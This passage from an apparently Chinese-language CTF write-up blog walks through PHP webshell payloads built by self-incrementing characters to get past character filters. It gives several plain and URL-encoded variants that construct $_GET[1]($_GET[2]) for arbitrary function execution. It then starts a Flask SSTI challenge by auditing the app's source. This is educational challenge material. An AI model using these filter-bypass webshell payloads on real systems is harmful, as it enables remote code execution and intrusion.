+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">[]</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="nv">$_</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">==</span><span class="s1">&#39;$&#39;</span><span class="p">];</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$___</span><span class="o">=</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">=</span><span class="nv">$___</span><span class="o">.</span><span class="nv">$__</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$_</span><span class="o">=</span><span class="s1">&#39;_&#39;</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$$_</span><span class="p">[</span><span class="nx">_</span><span class="p">](</span><span class="nv">$$_</span><span class="p">[</span><span class="nx">__</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">5</span><span class="nx">B</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">5</span><span class="nx">B</span><span class="s1">&#39;&#39;</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="s1">&#39;%24&#39;</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24__</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24___</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">24___</span><span class="o">.%</span><span class="mi">24__</span><span class="o">.%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="s1">&#39;_&#39;</span><span class="o">.%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">5</span><span class="nx">B_</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="p">(</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">5</span><span class="nx">B__</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这个paylaod不行，因为限制了字符，还是要利用数字，所以应该打$<code>_</code>GET[1] ($_GET[2])</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">[]</span><span class="o">.</span><span class="nx">_</span><span class="p">;</span><span class="c1">//Array
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span><span class="c1">//r
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="c1">//A
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//B
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_1</span><span class="o">=++</span><span class="nv">$_</span><span class="p">;</span><span class="c1">//$_1=C,$_=D(这里是前缀++，即先自增一再赋值)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="c1">//$_=H
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="nv">$_1</span><span class="o">.++</span><span class="nv">$_</span><span class="o">.</span><span class="nv">$__</span><span class="p">;</span><span class="c1">//CHr
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="nx">_</span><span class="o">.</span><span class="nv">$_</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">.</span><span class="nv">$_</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">.</span><span class="nv">$_</span><span class="p">(</span><span class="mi">84</span><span class="p">);</span><span class="c1">//_GET
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$$_</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="nv">$$_</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="c1">//$_GET[1]$_GET[2]
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">5</span><span class="nx">B</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="o">.</span><span class="nx">_</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24__</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">5</span><span class="nx">B1</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">5</span><span class="nx">B0</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_1</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">D</span><span class="o">%</span><span class="mi">24_1</span><span class="o">.%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">2</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">.%</span><span class="mi">24__</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">3</span><span class="nx">D_</span><span class="o">.%</span><span class="mi">24_</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">.%</span><span class="mi">24_</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">.%</span><span class="mi">24_</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">5</span><span class="nx">B1</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="p">(</span><span class="o">%</span><span class="mi">24</span><span class="o">%</span><span class="mi">24_</span><span class="o">%</span><span class="mi">5</span><span class="nx">B2</span><span class="o">%</span><span class="mi">5</span><span class="nx">D</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="nx">B</span><span class="o">%</span><span class="mi">20</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里是118个字符，比较极限，下面更好，只有111字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">([]</span><span class="o">.</span><span class="nx">_</span><span class="p">){</span><span class="mi">0</span><span class="p">};</span> <span class="c1">//A
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_1</span><span class="o">=++</span><span class="nv">$_</span><span class="p">;</span>  <span class="c1">//$_1=C
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_1</span><span class="o">.=++</span><span class="nv">$_</span><span class="o">.</span><span class="p">([]</span><span class="o">.</span><span class="nx">_</span><span class="p">){</span><span class="mi">1</span><span class="p">};</span> <span class="c1">//$_1=CHr
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="nx">_</span><span class="o">.</span><span class="nv">$_1</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">.</span><span class="nv">$_1</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">.</span><span class="nv">$_1</span><span class="p">(</span><span class="mi">84</span><span class="p">);</span> <span class="c1">//$_=_GET
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$$_</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="nv">$$_</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span> <span class="c1">//$_GET[1]($_GET[2])
+</span></span></span><span class="line"><span class="cl"><span class="c1">//缩短为一行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$_</span><span class="o">=</span><span class="p">([]</span><span class="o">.</span><span class="nx">_</span><span class="p">){</span><span class="mi">0</span><span class="p">};</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_1</span><span class="o">=++</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span><span class="nv">$_1</span><span class="o">.=++</span><span class="nv">$_</span><span class="o">.</span><span class="p">([]</span><span class="o">.</span><span class="nx">_</span><span class="p">){</span><span class="mi">1</span><span class="p">};</span><span class="nv">$_</span><span class="o">=</span><span class="nx">_</span><span class="o">.</span><span class="nv">$_1</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">.</span><span class="nv">$_1</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">.</span><span class="nv">$_1</span><span class="p">(</span><span class="mi">84</span><span class="p">);</span><span class="nv">$$_</span><span class="p">[</span><span class="mi">1</span><span class="p">](</span><span class="nv">$$_</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>[从CTFShow<a class="link" href="https://cloud.tencent.com/developer/article/2288274"  target="_blank" rel="noopener"
+    >RCE挑战]中学习自增构造webshell-腾讯云开发者社区-腾讯云</a></p>
+<p><a class="link" href="https://wanth3f1ag.top/2025/03/17/%e5%af%b9%e4%ba%8eRCE%e5%92%8c%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e7%9a%84%e4%b8%80%e7%82%b9%e6%80%bb%e7%bb%93/?highlight=%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab"  target="_blank" rel="noopener"
+    >对于RCE和文件包含的一点总结 | root@wanth3f1ag</a></p>
+<p>[<a class="link" href="https://boogipop.com/2023/03/02/[HNCTF]-challenge_rce/"  target="_blank" rel="noopener"
+    >HNCTF] challenge_rce - Boogiepop Doesn&rsquo;t Laugh</a></p>
+<h1 id="coding-loving-ssti">Coding Loving-ssti
+</h1><p>有源码先审计代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">from</span> <span class="nx">flask</span> <span class="nx">import</span> <span class="nx">Flask</span><span class="p">,</span> <span class="nx">request</span><span class="p">,</span> <span class="nx">render_template</span><span class="p">,</span> <span class="nx">session</span><span class="p">,</span> <span class="nx">url_for</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span> <span class="o">=</span> <span class="nx">Flask</span><span class="p">(</span><span class="nx">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="o">.</span><span class="nx">secret_key</span> <span class="o">=</span> <span class="s1">&#39;Ciallo～(∠・ω ＜）⌒★&#39;</span>  <span class="c1"># 设置应用密钥，用于会话加密
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义过滤关键词列表
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">FILTER_KEYWORDS</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;Ciallo～(∠・ω ＜）⌒★&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">TIME_LIMIT</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1"># 时间限制，未在代码中使用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义函数，检查输入中是否包含禁止的关键词
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">def</span> <span class="nx">contains_forbidden_keywords</span><span class="p">(</span><span class="nx">complaint</span><span class="p">)</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="nx">keyword</span> <span class="nx">in</span> <span class="nx">FILTER_KEYWORDS</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">keyword</span><span class="o">.</span><span class="nx">lower</span><span class="p">()</span> <span class="nx">in</span> <span class="nx">complaint</span><span class="o">:</span>  <span class="c1"># 检查关键词是否在输入中（不区分大小写）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="k">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">app</span><span class="o">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nx">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>  <span class="c1"># 定义路由 &#39;/&#39;，支持 GET 和 POST 方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">def</span> <span class="nx">index</span><span class="p">()</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">session</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;test&#39;</span>  <span class="c1"># 设置会话中的用户为 &#39;test&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">command</span> <span class="o">=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">form</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;coding&#39;</span><span class="p">)</span>  <span class="c1"># 获取表单中的 &#39;cmd&#39; 值，默认为 &#39;coding&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="nx">command</span><span class="o">=</span><span class="nx">command</span><span class="p">)</span>  <span class="c1"># 渲染 index.html 模板，传递 command 参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nx">app</span><span class="o">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/test&#39;</span><span class="p">,</span> <span class="nx">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>  <span class="c1"># 定义路由 &#39;/test&#39;，支持 GET 和 POST 方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">def</span> <span class="nx">shell</span><span class="p">()</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">session</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;test&#39;</span><span class="o">:</span>  <span class="c1"># 检查会话中的用户是否为 &#39;test&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">render_template</span><span class="p">(</span><span class="s1">&#39;Auth.html&#39;</span><span class="p">)</span>  <span class="c1"># 如果不是，渲染 Auth.html 模板（可能是登录页面）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">abc</span> <span class="o">:=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">headers</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">))</span> <span class="nx">is</span> <span class="nx">None</span><span class="o">:</span>  <span class="c1"># 获取 User-Agent 头，如果不存在
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">render_template</span><span class="p">(</span><span class="s1">&#39;Auth.html&#39;</span><span class="p">)</span>  <span class="c1"># 返回 Auth.html 模板
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="nx">cmd</span> <span class="o">=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">args</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;试一试&#39;</span><span class="p">)</span>  <span class="c1"># 获取 URL 参数中的 &#39;cmd&#39; 值，默认为 &#39;试一试&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nx">request</span><span class="o">.</span><span class="nx">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="o">:</span>  <span class="c1"># 如果是 POST 请求
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">css_url</span> <span class="o">=</span> <span class="nx">url_for</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="nx">filename</span><span class="o">=</span><span class="s1">&#39;style.css&#39;</span><span class="p">)</span>  <span class="c1"># 生成静态文件 style.css 的 URL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">command</span> <span class="o">=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">form</span><span class="o">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">)</span>  <span class="c1"># 获取表单中的 &#39;cmd&#39; 值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nx">contains_forbidden_keywords</span><span class="p">(</span><span class="nx">command</span><span class="p">)</span><span class="o">:</span>  <span class="c1"># 检查命令中是否包含禁止的关键词
